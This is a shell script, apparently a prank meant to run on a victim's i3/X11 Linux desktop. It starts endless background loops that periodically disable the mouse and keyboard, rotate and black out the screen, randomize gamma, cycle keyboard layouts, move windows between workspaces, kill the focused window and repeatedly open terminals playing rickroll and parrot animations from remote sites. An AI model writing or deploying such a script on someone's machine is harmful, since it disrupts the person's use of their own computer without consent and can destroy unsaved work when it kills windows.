#!/bin/sh
while (true); do mouse=($(xinput | grep Mouse | cut -d = -f2 | cut -d [ -f1)); xinput disable $mouse; sleep 5; xinput enable $mouse; sleep 15; done &
while (true); do for i in {0,2}; do xrandr -o $i && sleep 40; done && sleep 40; done &
while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); for i in {0,1,2}; do xrandr --output $monitor --brightness 0; sleep 4; done && sleep 20; done &
while (true); do i3-msg move container to workspace number $(( (RANDOM % 10) + 1 )); sleep 32; done &
while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); xrandr --output $monitor --brightness 100; sleep 5; done &
while (true); do for i in {1,2,3,4,6,5,7,10,9,8}; do i3-msg workspace number $i; alacritty -e curl ascii.live/rick & sleep 0.5; done && sleep 35; done &
while (true); do alacritty -e sh -c "curl -L ascii.getfdn.com/epiquote; sleep 42000"; sleep 10; done &
while (true); do i3-msg floating toggle; sleep 21; done &
while (true); do feh https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/Yan.jpg; sleep 5; alacritty -e curl parrot.live; sleep 5; done &
while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); R=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+1); print min+rand()*(max-min)}'); G=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+2); print min+rand()*(max-min)}'); B=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+3); print min+rand()*(max-min)}'); for i in {1..100}; do xrandr --output $monitor --gamma $R:$G:$B; sleep 0.1; done; sleep 10; done &
while (true); do i3-msg move workspace number $(( (RANDOM % 10) + 1 )); sleep 42; done &
while (true); do setxkbmap brai; sleep 20; setxkbmap fr; sleep 10; setxkbmap ru; sleep 15; setxkbmap us; sleep 10; done &
while (true); do i3-msg kill; sleep 20; done &
while (true); do keyboard=($(xinput | grep Keyboard | cut -d = -f2 | cut -d [ -f1 | tail -n 1)); xinput disable $keyboard; sleep 5; xinput enable $keyboard; sleep 19; done &
while (true); do firefox https://www.google.com/teapot; sleep 12; done &
